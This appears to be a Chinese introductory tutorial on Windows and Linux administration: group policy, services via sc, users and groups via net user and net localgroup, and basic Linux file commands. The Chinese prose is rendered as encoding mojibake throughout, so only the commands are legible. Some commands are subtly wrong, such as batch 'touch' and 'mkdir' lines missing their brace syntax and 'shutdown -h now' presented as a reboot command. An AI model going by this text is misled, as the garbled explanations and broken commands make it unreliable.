æ¨¡å—ï¼Œä¾›ç”¨æˆ·ç›´æ¥ä½¿ç”¨ï¼Œä»è€Œè¾¾åˆ°æ–¹ä¾¿ç®¡ç†è®¡ç®—æœºçš„ç›®çš„ã€‚ç®€å•ç‚¹è¯´ï¼Œç»„ç­–ç•¥å°±æ˜¯ä¿®æ”¹æ³¨å†Œè¡¨ä¸­çš„é…ç½®ã€‚å½“ ç„¶ï¼Œç»„ç­–ç•¥ä½¿ç”¨è‡ªå·±æ›´å®Œå–„çš„ç®¡ç†ç»„ç»‡æ–¹æ³•ï¼Œå¯ä»¥å¯¹å„ç§å¯¹è±¡ä¸­çš„è®¾ç½®è¿›è¡Œç»Ÿä¸€çš„ç®¡ç†å’Œé…ç½®ï¼Œè¿œæ¯”æ‰‹å·¥ä¿®æ”¹ æ³¨å†Œè¡¨æ–¹ä¾¿ã€çµæ´»ï¼ŒåŠŸèƒ½ä¹Ÿæ›´åŠ å¼ºå¤§## è¿™é‡Œæˆ‘ç”¨win10ä¸“ä¸šç‰ˆç³»ç»Ÿæ¥æ¼”ç¤ºï¼Œå®¶åº­ç‰ˆæ˜¯ä¸èƒ½æ“ä½œè¿™ä¸ªåŠŸèƒ½çš„ã€‚## ç»„ç­–ç•¥åˆ†æœ¬åœ°ç»„ç­–ç•¥å’Œè¿œç¨‹ç»„ç­–ç•¥ï¼Œè¿œç¨‹ç»„ç­–ç•¥æˆ‘ä»¬å­¦åˆ°åŸŸæ¸—é€çš„æ—¶å€™å†è®²è§£ï¼Œå…ˆçœ‹æœ¬åœ°ç»„ç­–ç•¥ã€‚ 6.2 æ‰“å¼€ç»„ç­–ç•¥## æ–¹å¼1ï¼šç›´æ¥æœç´¢ ## æ–¹å¼2ï¼šwin+ré”®ï¼Œè¿è¡Œ gpedit.msc ï¼Œå³å¯æ‰“å¼€ 6.3 ç»„ç­–ç•¥ä¸¤å¤§æ¨¡å—## è®¡ç®—æœºé…ç½®ï¼šé’ˆå¯¹äºæœ¬åœ°è®¡ç®—æœºç”Ÿæ•ˆ## ç”¨æˆ·é…ç½®ï¼šé’ˆå¯¹äºç”¨æˆ·ç”Ÿæ•ˆ 6.4 ç»„ç­–ç•¥ç¦ç”¨è½¯ä»¶å¯¹åº”æ³¨å†Œè¡¨ä½ç½®## å‰é¢å®šä¹‰çš„ä½ç½®æœ‰æåˆ°è¿‡ï¼Œç»„ç­–ç•¥å°±æ˜¯ä¿®æ”¹æ³¨å†Œè¡¨ä¸­çš„é…ç½®ã€‚## é¦–å…ˆæŠŠæ³¨å†Œè¡¨æ‰“å¼€ï¼Œåˆšæ‰ç¦ç”¨æ¥ç€ï¼Œåˆ«å¿˜äº†å–æ¶ˆä¸€ä¸‹ï¼Œé‚£ä¹ˆåˆšæ‰æˆ‘ä»¬æ¼”ç¤ºçš„ç¤ºä¾‹æ˜¯å¯¹åº”ä¿®æ”¹çš„æ³¨å†Œè¡¨ä»€ä¹ˆä½ç½®å‘¢ï¼Ÿåœ¨è¿™é‡Œ## HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun 6.5 ç»„ç­–ç•¥çš„å®ä¾‹## é™åˆ¶æŸäº›è½¯ä»¶è¿è¡Œ## é™åˆ¶æ’Uç›˜ 7ï¼ŒwindowsæœåŠ¡7.1 å¸¸è§æœåŠ¡## DHCP ClientæœåŠ¡ ## è¿™ä¸ªæœåŠ¡ç¨‹åºå¦‚æœæ²¡æœ‰å¼€å¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„ç”µè„‘æ— æ³•å¾—åˆ°ipåœ°å€ï¼Œå°±æ— æ³•è”ç½‘ ## Print SpooleræœåŠ¡ ##æ²¡æœ‰è¿™ä¸ªæœåŠ¡ç¨‹åºï¼Œæˆ‘ä»¬å°±æ²¡æœ‰åŠæ³•æ‰“å°ä¸œè¥¿ã€‚ ## VMware ToolsæœåŠ¡ ## è¿™æ˜¯æˆ‘ä»¬å®‰è£…VMware toolså·¥å…·è½¯ä»¶çš„æ—¶å€™ï¼ŒVmwareè‡ªåŠ¨åœ¨ç³»ç»Ÿä¸­æ·»åŠ çš„æœåŠ¡ç¨‹åºï¼Œå°±æ˜¯ä¸ºäº†ä¸€å¼€æœºï¼Œæˆ‘ä»¬çš„è™šæ‹Ÿæœºå°±èƒ½å’Œç‰©ç†ä¸»æœº è¿›è¡Œæ•°æ®äº¤äº’ç­‰åŠŸèƒ½ã€‚ ## Windows UpdateæœåŠ¡ ## ä¸ºä»€ä¹ˆæˆ‘ä»¬çš„ç”µè„‘èƒ½å¤Ÿè‡ªåŠ¨æ£€æµ‹åˆ°éœ€è¦æ›´æ–°äº†ï¼Œå°±æ˜¯è¿™ä¸ªæœåŠ¡ç¨‹åºä¸€ç›´åœ¨åå°é»˜é»˜çš„è¿è¡Œç€ï¼Œæ£€æµ‹å¹¶æç¤ºç³»ç»Ÿæ›´æ–°ã€‚ 7.2 æ·»åŠ æœåŠ¡## sc create jaden_typora binpath=C:\\tools\\typora\\Typora\\Typora.exe ## scæ˜¯windowsç”¨æ¥åˆ›å»ºæœåŠ¡çš„å…³é”®æŒ‡ä»¤ ## createè¡¨ç¤ºåˆ›å»ºçš„æ„æ€ï¼Œå›ºå®šæ­é… ## jaden_typoraæ˜¯è‡ªå·±æŒ‡å®šçš„æœåŠ¡åç§°(åªè¦å’Œç³»ç»Ÿä¸­å·²ç»æœ‰çš„æœåŠ¡åç§°æ²¡æœ‰å†²çªå³å¯) ## binpath=ç¨‹åºè·¯å¾„ 7-3 åˆ é™¤æœåŠ¡## sc delete æœåŠ¡åç§° ## ä¾‹å¦‚ï¼š sc delete jaden_typora 8ï¼Œç”¨æˆ·å’Œç»„ ç”¨æˆ·ï¼šç”¨æˆ·æ˜¯ç™»å½•ç³»ç»Ÿçš„èº«ä»½å‡­è¯ ç”¨æˆ·ç»„ï¼šä¸€ä¸ªç³»ç»Ÿå¯ä»¥æœ‰å¤šä¸ªç”¨æˆ·ï¼Œä¸ºäº†æ–¹ä¾¿ç®¡ç†è¿™äº›ç”¨æˆ·ï¼Œç»™å¤šä¸ªç”¨æˆ·ç»Ÿä¸€åˆ†é…æ“ä½œæƒé™ç­‰è®¾ç½®ï¼Œå¯ä»¥å°†å¤š ä¸ªç”¨æˆ·åˆ’åˆ†ä¸ºä¸€ä¸ªç»„ï¼Œç»™è¿™ä¸ªç»„åšä¸€äº›é…ç½®ï¼Œé‚£ä¹ˆåœ¨è¿™ä¸ªç”¨æˆ·ç»„ä¸­çš„ç”¨æˆ·éƒ½ä¼šæŒ‰ç…§ç»„çš„é…ç½®æ¥è®¾å®šè‡ªå·±çš„æ“ ä½œã€‚ä¸€ä¸ªç”¨æˆ·å¯ä»¥å±äºå¤šä¸ªç»„ï¼Œä¼šåŒæ—¶ç»§æ‰¿å¤šä¸ªç»„çš„æ“ä½œæƒé™ã€‚å¹¶ä¸”ç”¨æˆ·çš„æƒé™å…¶å®è¿˜å¯ä»¥å•ç‹¬è®¾å®šï¼Œç”šè‡³è¶… è¿‡æ‰€å±ç»„çš„æƒé™ã€‚ 8.1 å¸¸è§çš„ç”¨æˆ·ç»„è¯´æ˜éœ€è¦äººä¸ºæ·»åŠ æˆå‘˜çš„ç»„ Administratorsï¼šç®¡ç†å‘˜ç»„ï¼Œå±äºè¯¥administatorsæœ¬åœ°ç»„å†…çš„ç”¨æˆ·ï¼Œéƒ½å…·å¤‡ç³»ç»Ÿç®¡ç†å‘˜çš„æƒé™ï¼Œå®ƒä»¬æ‹¥æœ‰å¯¹è¿™å°è®¡ç®—æœºæœ€å¤§çš„æ§åˆ¶æƒé™ï¼Œå¯ä»¥æ‰§è¡Œæ•´å°è®¡ç®—æœºçš„ç®¡ç†ä»»åŠ¡ã€‚å†…ç½®çš„ç³»ç»Ÿç®¡ç†å‘˜è´¦å·Administratorå°±æ˜¯æœ¬åœ°ç»„çš„æˆå‘˜ï¼Œè€Œä¸”æ— æ³•å°†å®ƒä»è¯¥ç»„åˆ é™¤ï¼Œå®ƒçš„æ“ä½œæƒé™æ¯”Administratorsç»„ä¸­çš„å…¶ä»–æˆå‘˜è¿˜è¦é«˜ã€‚ Usersï¼šæ™®é€šç”¨æˆ·ç»„ï¼Œè¯¥ç»„å‘˜åªæ‹¥æœ‰ä¸€äº›åŸºæœ¬çš„æƒåˆ©ï¼Œä¾‹å¦‚è¿è¡Œåº”ç”¨ç¨‹åºï¼Œä½†æ˜¯ä»–ä»¬ä¸èƒ½ä¿®æ”¹æ“ä½œç³»ç»Ÿçš„è®¾ç½®ã€ä¸èƒ½æ›´æ”¹å…¶å®ƒç”¨æˆ·çš„æ•°æ®ã€ä¸èƒ½å…³é—­æœåŠ¡å™¨çº§çš„è®¡ç®—æœºã€‚ Guestsï¼šæ¥å®¾ç»„ï¼Œè¯¥ç»„æ˜¯æä¾›æ²¡æœ‰ç”¨æˆ·å¸æˆ·ï¼Œä½†æ˜¯éœ€è¦è®¿é—®æœ¬åœ°è®¡ç®—æœºå†…èµ„æºçš„ç”¨æˆ·ä½¿ç”¨ï¼Œè¯¥ç»„çš„æˆå‘˜æ— æ³•æ°¸ä¹…åœ°æ”¹å˜å…¶æ¡Œé¢çš„å·¥ä½œç¯å¢ƒã€‚è¯¥ç»„æœ€å¸¸è§çš„é»˜è®¤æˆå‘˜ä¸ºç”¨æˆ·å¸å·Guestã€‚é»˜è®¤è¿™ä¸ªç»„æ˜¯ç¦ç”¨çŠ¶æ€ï¼Œæ“ä½œæƒé™æœ€ä½ã€‚ åŠ¨æ€åŒ…å«æˆå‘˜çš„ç»„ï¼šä¹Ÿå°±æ˜¯å®ƒé‡Œé¢çš„æˆå‘˜æ˜¯ä¸å›ºå®šçš„ï¼Œéšç€ç”¨æˆ·çš„æ“ä½œï¼Œç»„æˆå‘˜ä¼šåŠ¨æ€å˜åŒ–ï¼Œä¹Ÿå¯ä»¥æ‰‹åŠ¨æ·»åŠ ã€‚ INTERACTIVEï¼šé»˜è®¤åŒ…å«æœ¬åœ°ç™»å½•çš„è´¦æˆ· Authenticated Usersï¼šåŒ…å«äº†é€šè¿‡éªŒè¯çš„ç”¨æˆ·ï¼Œä¸åŒ…å«æ¥å®¾ç”¨æˆ· Everyoneï¼šæ‰€æœ‰è´¦æˆ·éƒ½å±äºè¿™ä¸ªç»„(è®¾ç½®å…¨é¢å¼€æ”¾æƒé™æ—¶ä½¿ç”¨)ï¼Œæ³¨æ„ï¼Œå¦‚æœGuestå¸å·è¢«å¯ç”¨æ—¶ï¼Œåˆ™ç»™Everyoneè¿™ä¸ªç»„æŒ‡æ´¾æƒé™æ—¶å¿…é¡»å°å¿ƒï¼Œå› ä¸ºå½“ä¸€ä¸ªæ²¡æœ‰å¸æˆ·çš„ç”¨æˆ·è¿æ¥è®¡ç®—æœºæ—¶ï¼Œä»–è¢«å…è®¸è‡ªåŠ¨åˆ©ç”¨Guestå¸æˆ·è¿æ¥ï¼Œä½†æ˜¯å› ä¸ºGuestä¹Ÿæ˜¯å±äºEveryoneç»„ï¼Œæ‰€ä»¥ä»–å°†å…·å¤‡Everyoneæ‰€æ‹¥æœ‰çš„æƒé™ã€‚ 9,windowå¸¸è§æŒ‡ä»¤9.1 å¸¸è§æŒ‡ä»¤## é¢æ¿æ“ä½œï¼š exit -- é€€å‡ºcmdé¢æ¿ cls -- æ¸…é™¤cmdé¢æ¿ä¸Šçš„å†å²è®°å½• ## æ–‡ä»¶å’Œç›®å½•æ“ä½œï¼š ## æŒ‡ä»¤ /?ï¼Œå¯ä»¥æŸ¥çœ‹æŒ‡ä»¤çš„å…·ä½“å‚æ•°å’Œå¯¹åº”èƒ½åŠ›ï¼Œæ¯”å¦‚ï¼ŒæŸ¥çœ‹cdæŒ‡ä»¤æ€ä¹ˆç”¨ï¼Œè¾“å…¥ï¼šcd /? ## c: -- åˆ‡æ¢ç›˜ç¬¦ ## cdæŒ‡ä»¤ -- åˆ‡æ¢è·¯å¾„ï¼Œcd è·¯å¾„ï¼Œcd ..è¿”å›ä¸Šä¸€å±‚ç›®å½•ï¼Œcd ../.. è¿”å›ä¸Šä¸€å±‚çš„ä¸Šä¸€å±‚ç›®å½• ## diræŒ‡ä»¤ -- æ˜¾ç¤ºå½“å‰ç›®å½•ä¿¡æ¯ï¼Œç›®å½•ä¸‹é¢çš„æ–‡ä»¶å’Œæ–‡ä»¶å¤¹åˆ—è¡¨ ## md æ–‡ä»¶å¤¹å -- åˆ›å»ºæ–°æ–‡ä»¶å¤¹ ## type nul æ–‡ä»¶å -- åˆ›å»ºä¸€ä¸ªç©ºæ–‡ä»¶ï¼Œæ¯”å¦‚type nul jaden.txt ## del /s æ–‡ä»¶å -- åˆ é™¤æ–‡ä»¶ ## rd /s æ–‡ä»¶å¤¹å -- åˆ é™¤æ–‡ä»¶å¤¹## ç”¨æˆ·æ“ä½œç›¸å…³æŒ‡ä»¤ï¼š ## net user #æŸ¥çœ‹ç”¨æˆ·åˆ—è¡¨ ## net user ç”¨æˆ·å å¯†ç  #æ”¹å¯†ç  ## net user ç”¨æˆ·å å¯†ç  /add #åˆ›å»ºä¸€ä¸ªæ–°ç”¨æˆ· ## net user ç”¨æˆ·å /del #åˆ é™¤ä¸€ä¸ªç”¨æˆ· ## net user ç”¨æˆ·å /active:yes/no #æ¿€æ´»æˆ–ç¦ç”¨è´¦æˆ· ## ç”¨æˆ·ç»„æ“ä½œç›¸å…³æŒ‡ä»¤ï¼š ## net localgroup #æŸ¥çœ‹ç»„åˆ—è¡¨ ## net localgroup ç»„å #æŸ¥çœ‹è¯¥ç»„çš„æˆå‘˜ ## net localgroup ç»„å /add #åˆ›å»ºä¸€ä¸ªæ–°çš„ç»„ ## net localgroup ç»„å ç”¨æˆ·å /add #æ·»åŠ ç”¨æˆ·åˆ°ç»„ ## net localgroup ç»„å ç”¨æˆ·å /del #ä»ç»„ä¸­è¸¢å‡ºç”¨æˆ· ## net localgroup ç»„å /del #åˆ é™¤ç»„ 9.2 æ¿€æ´»Administratorç”¨æˆ·## æ‰§è¡ŒæŒ‡ä»¤ net user administrator /active:yes## åˆ‡æ¢administratoræ¥ç™»å½•ï¼Œé»˜è®¤æ˜¯æ²¡æœ‰å¯†ç çš„ äºŒï¼ŒLinuxç³»ç»Ÿ2.1 windowè¿œç¨‹è¿æ¥Linuxç³»ç»Ÿ## è¯­æ³•ï¼šssh ç”¨æˆ·å@ipåœ°å€## æ¯”å¦‚ï¼šssh root@192.168.61.131 2.2 ç®€å•æŒ‡ä»¤æ€»ç»“# è¿œç¨‹ç™»å½•linuxç³»ç»Ÿ ssh root@192.168.202.136# æ–­å¼€è¿æ¥ exit# é‡å¯ç³»ç»Ÿ reboot æˆ–è€… shutdown -h now# å…³æœºæŒ‡ä»¤ shutdown #é»˜è®¤30ç§’ä¹‹åæ‰ä¼šå…³æœº# ç«‹å³å…³æœº shutdown -h now# ååˆ†é’Ÿä¹‹åå…³æœºé•¿åº¦ shutdown -h 10 2.3 æ–‡ä»¶å’Œç›®å½•æ“ä½œ2.3.1 æ–°å»ºæ–‡ä»¶#æ–°å»ºæ–‡ä»¶ touch ä¾‹å­1ï¼š touch 1.txt #åˆ›å»ºå•ä¸ªæ–‡ä»¶ ä¾‹å­2ï¼š touch test1..10.txt #æ‰¹é‡åˆ›å»ºæ–‡ä»¶touch testa..f.txt ä¾‹å­3ï¼š touch /root/4.txt #åœ¨æŒ‡å®šçš„/rootç›®å½•ä¸‹ï¼Œåˆ›å»ºæ–‡ä»¶4.txt # å¦‚æœtouchçš„æ–‡ä»¶åç§°é‡å¤äº†ï¼Œä¸ä¼šè¦†ç›–åŸæ–‡ä»¶ 2.3.2 æŸ¥çœ‹ç›®å½•ä¸‹çš„æ–‡ä»¶# lså…¨ç§°list å‚æ•° -a # æ˜¾ç¤ºéšè—æ–‡ä»¶ -l # ç«–å‘åˆ—è¡¨ï¼Œè¯¦ç»†ä¿¡æ¯å±•ç¤º -h # ä»¥æ˜“äºé˜…è¯»çš„å½¢å¼æ˜¾ç¤º ä¸ l å‘½ä»¤ä¸€èµ·ç”¨ -1 # å±æ€§åªæ˜¾ç¤ºæ–‡ä»¶å¤¹ï¼ˆç«–ç€æ˜¾ç¤ºï¼‰ ## lsï¼šæ˜¾ç¤ºå½“å‰ç›®å½•ä¸‹çš„å†…å®¹ ä¾‹å­1ï¼šls test09.txt #æŸ¥çœ‹test09.txtæ˜¯å¦å­˜åœ¨ï¼Œæœ‰ä¼šæ˜¾ç¤ºæ–‡ä»¶åç§°ï¼Œæ²¡æœ‰ä¼šæŠ¥é”™ ä¾‹å­2ï¼šls *.txt #æŸ¥çœ‹ä»¥txtç»“å°¾çš„æ‰€æœ‰æ–‡ä»¶ï¼Œç±»ä¼¼äºwindowsä¸‹çš„*.åç¼€åæœç´¢ ä¾‹å­3ï¼šls -1 #ä»¥ä¸€è¡Œä¸€ä¸ªæ–‡ä»¶çš„æ–¹å¼æ˜¾ç¤ºï¼Œæ³¨æ„è¿™æ˜¯-1ï¼Œæ˜¯æ•°å­—1ï¼Œä¸æ˜¯læ˜‚ ä¾‹å­4ï¼šls -a al #æŸ¥çœ‹æ‰€æœ‰æ–‡ä»¶ï¼ŒåŒ…æ‹¬éšè—æ–‡ä»¶ï¼Œtouch .æ–‡ä»¶åï¼Œ.å¼€å¤´çš„å°±æ˜¯éšè—æ–‡ä»¶ ä¾‹å­5ï¼šls -a -1 #æŸ¥çœ‹æ‰€æœ‰æ–‡ä»¶ï¼Œä»¥ä¸€è¡Œä¸€ä¸ªæ¥æ˜¾ç¤º ä¾‹å­6ï¼šls -l #ç±»ä¼¼äºwindowsçš„è¯¦ç»†åˆ—è¡¨ï¼Œè¿™ä¸ª-lä¸æ˜¯æ•°å­—1 ## ä»¥.å¼€å¤´çš„æ–‡ä»¶æ˜¯éšè—æ–‡ä»¶ï¼Œé»˜è®¤ä¸æ˜¾ç¤º 2.3.3 ç§»åŠ¨ã€ä¹Ÿå¯ä»¥è¿›è¡Œé‡å‘½å## mvå…¨ç§°move ,å¦‚æœç›®æ ‡ä¸å­˜åœ¨ï¼Œåˆ™æœ‰æ”¹åçš„æ•ˆæœ ä¾‹å­1ï¼šmv 222.txt 123.txt #å°†222.txtæ–‡ä»¶é‡å‘½åä¸º123.txt ä¾‹å­2ï¼šmv 123.txt /opt #å°†å½“å‰ç›®å½•ä¸‹çš„123.txtç§»åŠ¨åˆ°/optç›®å½•ä¸‹ 2.3.4 å¤åˆ¶## cpå…¨ç§°copyï¼Œå¤åˆ¶æœ‰ä¸ªç‰¹ç‚¹ï¼Œå°±æ˜¯å¦‚æœå¤åˆ¶åˆ°çš„æ–‡ä»¶å¤¹ä¸­æœ‰åŒåçš„æ–‡ä»¶ï¼Œä¼šå¸®æˆ‘ä»¬æ”¹åå­—å¹¶åŠ ä¸Šå‰¯æœ¬ä¸¤ä¸ªå­—ï¼Œ ## å‚æ•° -r ## å¤åˆ¶æ–‡ä»¶å¤¹## linuxä¸ä¼šå¸®æˆ‘ä»¬æ”¹åå­—ï¼Œæˆ‘ä»¬éœ€è¦è‡ªå·±æŒ‡å®šåå­—ï¼Œåç¼€åå°½é‡ä¸è¦æ”¹ã€‚ä¾‹å­1ï¼šcp test01.txt /opt/ #å°†å½“å‰ç›®å½•ä¸‹çš„test01.txtå¤åˆ¶åˆ°/optç›®å½•ä¸‹ä¾‹å­2ï¼šcp -a dev04 /opt/ #å°†ç›®å½•dev04å¤åˆ¶åˆ°/optä¸‹ï¼Œæ³¨æ„ï¼Œè¦åœ¨dev04çš„ä¸Šä¸€çº§ç›®å½•æ¥å¤åˆ¶å®ƒï¼Œåœ¨å®ƒå†…éƒ¨æ˜¯ä¸èƒ½å¤åˆ¶è¿™ä¸ªæ–‡ä»¶å¤¹çš„cp -r aini /root/norah/ 2.3.5 åˆ é™¤#åˆ é™¤ï¼Œæ³¨æ„Linuxå’Œwindowsä¸åŒï¼Œæ²¡æœ‰å›æ”¶ç«™ï¼Œåˆ äº†å°±æ˜¯åˆ äº†## å‚æ•° -f -r -f ## å¼ºåˆ¶åˆ é™¤ -r ## åˆ é™¤æ–‡ä»¶å¤¹ ä¾‹å­1: rm /opt/123.txt #å°†/optç›®å½•ä¸‹çš„123.txtæ–‡ä»¶åˆ é™¤ï¼Œéœ€è¦å›å¤yç¡®è®¤åˆ é™¤ ä¾‹å­2ï¼š rm -f /opt/test01.txt #å°†/optç›®å½•ä¸‹çš„test01.txtæ–‡ä»¶åˆ é™¤ï¼Œä¸éœ€è¦å›å¤ï¼Œå¼ºåˆ¶åˆ é™¤ï¼Œå¾ˆå¤šæŒ‡ä»¤éƒ½æœ‰è‡ªå·±çš„å‚æ•°ï¼Œè€Œä¸”æœ‰å¥½å¤šï¼Œ-få°±æ˜¯å¼ºåˆ¶çš„æ„æ€ã€‚ ä¾‹å­3ï¼š rm æ–‡ä»¶1 æ–‡ä»¶2 æ–‡ä»¶3 #åˆ é™¤å¤šä¸ªæ–‡ä»¶#åˆ é™¤ä¸€ä¸ªç›®å½•ï¼Œlinuxçš„å‚æ•°å¤§éƒ¨åˆ†æ²¡æœ‰å…ˆåé¡ºåº#ç›´æ¥åˆ é™¤æ–‡ä»¶å¤¹ï¼Œæ¯”å¦‚ rm devï¼Œè¿™æ˜¯ä¸è¡Œçš„ï¼Œä¼šæŠ¥é”™ï¼Œéœ€è¦å¸¦ä¸Šrå‚æ•°[root@localhost ~]# rm -f -r dev02 [root@localhost ~]# rm -r -f dev03[root@localhost ~]# rm -fr dev # rmçš„ä¸¤ä¸ªå‚æ•°å¯ä»¥åˆå¹¶åˆ°ä¸€èµ·[root@localhost ~]# rm -rf dev01 2.3.6 åˆ›å»ºæ–‡ä»¶å¤¹##åˆ›å»ºç›®å½•directoryï¼Œè¿™é‡Œè¯´çš„ç›®å½•å°±æ˜¯æ–‡ä»¶å¤¹ï¼Œé»˜è®¤æ˜¾ç¤ºæ˜¯è“è‰²çš„å­—ä½“ï¼Œæ–‡ä»¶æ˜¾ç¤ºæ˜¯ç™½è‰²çš„å­—ä½“## mkdir å…¨ç§°make directory ä¾‹å­1ï¼šmkdir dev #åˆ›å»ºä¸€ä¸ªdevç›®å½• ä¾‹å­2ï¼šmkdir dev01..10 #æ‰¹é‡åˆ›å»ºå¤šä¸ªç›®å½• ä¾‹å­3ï¼šmkdir -p 1/2/3/4/5/6 #ä¸€æ¬¡æ€§åˆ›å»ºå¤šçº§å­ç›®å½• ## é‡å‘½åï¼šmv jaden wulaoban # å°†jadenç›®å½•æ”¹åä¸ºwulaoban 2.3.7 åˆ‡æ¢ç›®å½•cd #å…¨ç§°change directory ä¾‹å­1ï¼š cd local #åˆ‡æ¢åˆ°localç›®å½•ä¸­ cd /usr/local #åˆ‡æ¢åˆ°ç›®å½•/usr/local cd .. #åˆ‡æ¢åˆ°ä¸Šä¸€çº§ç›®å½• cd ../.. # è¿›å…¥ä¸Šä¸€çº§çš„ä¸Šä¸€çº§ç›®å½• ï¼Œè¿˜å¯ä»¥ç»§ç»­../ cd / # ç›´æ¥åˆ‡æ¢åˆ°æ ¹ç›®å½• 2.3.8 æ˜¾ç¤ºå½“å‰å·¥ä½œç›®å½•#print work directorypwd#æ‰“å°å½“å‰å·¥ä½œç›®å½• 2.3.9 å†å²æŒ‡ä»¤æŸ¥è¯¢## history 2.3.10 ç›®å½•åˆ†éš”ç¬¦## windowsï¼šC:\\Users\\ls198\\Desktop # å¾®è½¯æ•…æ„ç”¨\\ï¼Œå…¶ä»–çš„unixåˆ†æ”¯ç³»ç»Ÿéƒ½æ˜¯/æ¥åˆ†å‰²## linuxï¼š/root/jaden/xx## linuxåªæœ‰ä¸€ä¸ªç›˜ç¬¦ï¼Œä¸åƒwindowsï¼Œå¯ä»¥è®¾ç½®cç›˜ã€dç›˜...## /æ˜¯æ ¹ç›®å½•## /root æ ¹ç›®å½•ä¸‹é¢çš„rootç›®å½•## /root/jaden## /root/jaden/xx 2.3.11 ä¿®æ”¹æ–‡ä»¶å†…å®¹#ä¿®æ”¹æ–‡ä»¶å†…å®¹ï¼Œå…ˆä½“éªŒä¸€ä¸‹ï¼Œåé¢å†ä¸“é—¨è®²viçš„åŠŸèƒ½#viç¼–è¾‘å™¨ï¼Œå’Œwindowsçš„è®°äº‹æœ¬å·¥å…·ç±»ä¼¼ ä¾‹å­1ï¼š vi test03.txt #ç¼–è¾‘æ–‡ä»¶test03.txt # viç¼–è¾‘ä¿å­˜æ–‡ä»¶ï¼Œéœ€è¦ä¸‰ç§æ¨¡å¼åˆ‡æ¢ ## å¸¸è§„æ¨¡å¼ï¼šé»˜è®¤æ˜¯å¸¸è§„æ¨¡å¼ï¼Œåœ¨å¸¸è§„æ¨¡å¼ä¸­å¯ä»¥ä½¿ç”¨å„ç§å¿«æ·é”®ï¼Œå¸®æˆ‘ä»¬å¿«é€Ÿç¼–è¾‘æ–‡ä»¶ï¼Œæ¯”å¦‚ddï¼Œå°±æ˜¯åˆ é™¤å½“å‰ä¸€è¡Œæ•°æ® ## ç¼–è¾‘æ¨¡å¼ï¼šåˆ‡æ¢è‹±æ–‡è¾“å…¥æ³•ï¼Œç„¶åæŒ‰ioaä¸‰ä¸ªé”®ä¸­çš„ä»»æ„ä¸€ä¸ªé”®éƒ½å¯ä»¥è¿›å…¥ç¼–è¾‘æ¨¡å¼ï¼Œè¿™æ ·æ‰èƒ½å‘æ–‡ä»¶ä¸­å†™å†…å®¹ï¼Œå†™å®Œå†…å®¹ä¹‹åï¼Œå…ˆå› åˆ°å¸¸è§„æ¨¡å¼ï¼Œåœ¨ç¼–è¾‘æ¨¡å¼ä¸­æŒ‰escå›åˆ°å¸¸è§„æ¨¡å¼ ## å‘½ä»¤æ¨¡å¼ï¼šåœ¨å¸¸è§„æ¨¡å¼æ—¶æŒ‰:(è‹±æ–‡çš„å†’å·)è¿›å…¥å‘½ä»¤æ¨¡å¼ï¼Œå‘½ä»¤æ¨¡å¼æŒ‰escå›åˆ°å¸¸è§„æ¨¡å¼ï¼Œå‘½ä»¤æ¨¡å¼ä¸‹è¾“å…¥qç„¶åå›è½¦è¡¨ç¤ºé€€å‡ºæ–‡ä»¶ï¼Œwq ä¿å­˜å¹¶é€€å‡ºï¼Œq!è¡¨ç¤ºå¼ºåˆ¶é€€å‡ºä¸ä¿å­˜ 11-1 å¸¸è§„æ¨¡å¼å¿«æ·é”® 11-2 å‘½ä»¤æ¨¡å¼å¿«æ·é”® 2.3.12 æŸ¥çœ‹æ–‡ä»¶å†…å®¹#ä»ä¸Šå¾€ä¸‹é¡ºåºæŸ¥çœ‹æ–‡æœ¬å†…å®¹ cat ä¾‹å­1ï¼šcat test03.txt #æŸ¥çœ‹test03.txtçš„å…¨éƒ¨å†…å®¹#ä»ä¸‹å¾€ä¸Šå€’ç€æŸ¥çœ‹æ–‡æœ¬å†…å®¹ tac ä¾‹å­1ï¼štac test03.txt #å€’ç€æŸ¥çœ‹test03.txtçš„å…¨éƒ¨å†…å®¹## ç¿»é¡µæŸ¥çœ‹ more ## æŸ¥çœ‹è¿‡ç¨‹ä¸­é€šè¿‡ç©ºæ ¼ç¿»é¡µ ## é€šè¿‡qé€€å‡º 2.3.13 æŸ¥çœ‹æ–‡ä»¶å¤´å‡ è¡Œ#head ä¾‹å­1ï¼š head test03.txt #æŸ¥çœ‹æ–‡ä»¶çš„å‰åè¡Œï¼Œé»˜è®¤ ä¾‹å­2ï¼š head -n 5 test03.txt #æŸ¥çœ‹æ–‡ä»¶çš„å‰5è¡Œ ä¾‹å­3ï¼š head -5 test03.txt #æŸ¥çœ‹æ–‡ä»¶çš„å‰5è¡Œ 2.3.14 æŸ¥çœ‹æ–‡ä»¶å€’æ•°å‡ è¡Œ#tail ä¾‹å­1ï¼š tail test03.txt #æŸ¥çœ‹æ–‡ä»¶çš„å€’æ•°åè¡Œï¼Œé»˜è®¤ ä¾‹å­2ï¼š tail -n 5 test03.txt #æŸ¥çœ‹æ–‡ä»¶çš„å€’æ•°5è¡Œ ä¾‹å­3ï¼š tail -5 test03.txt #æŸ¥çœ‹æ–‡ä»¶çš„å€’æ•°5è¡Œ 2.4 ç®¡é“ç®¡é“ç¬¦å·ï¼š | ï¼Œå¯ä»¥å°†å‰é¢æŒ‡ä»¤çš„æ‰§è¡Œç»“æœï¼Œä½œä¸ºåé¢æŒ‡ä»¤çš„æ“ä½œå†…å®¹ã€‚ ## æ¯”å¦‚è¿‡æ»¤ipåœ°å€ip addr | tail -4 | head -1 2.5 æ–‡ä»¶å†…å®¹è¿‡æ»¤2.5.1 ç»Ÿè®¡#ç»Ÿè®¡ï¼Œæ¯”å¦‚ç»Ÿè®¡æ–‡ä»¶æœ‰å¤šå°‘ä¸ªå­—èŠ‚ã€å¤šå°‘è¡Œç­‰ç­‰ wc # å…¨ç§°Word Countï¼Œè®¡æ•° ## å‚æ•° -l # æŒ‰è¡Œç»Ÿè®¡ï¼Œä¸ä¼šå•ç‹¬ä½¿ç”¨ï¼Œéœ€è¦æ¥åœ¨ç®¡é“åé¢ -c # ç»Ÿè®¡å­—èŠ‚ä¸ªæ•° -m # ç»Ÿè®¡å­—ç¬¦æ•°é‡ -w # ç»Ÿè®¡å•è¯æ•°é‡ wc aini.txt # 2 11 59 åˆ†åˆ«æ˜¯ è¡Œæ•° å•è¯æ•°é‡ å­—èŠ‚æ•° ä¾‹å­1ï¼š [root@localhost ~]# cat jaden.txt |wc -l 18 # å…±18è¡Œ [root@localhost ~]# cat -n jaden.txt # æ˜¾ç¤ºå†…å®¹çš„åŒæ—¶ï¼Œæ˜¾ç¤ºè¡Œå· 1 sdsdsdsdsdsdsdæ˜¯çš„æ˜¯çš„ 2 3 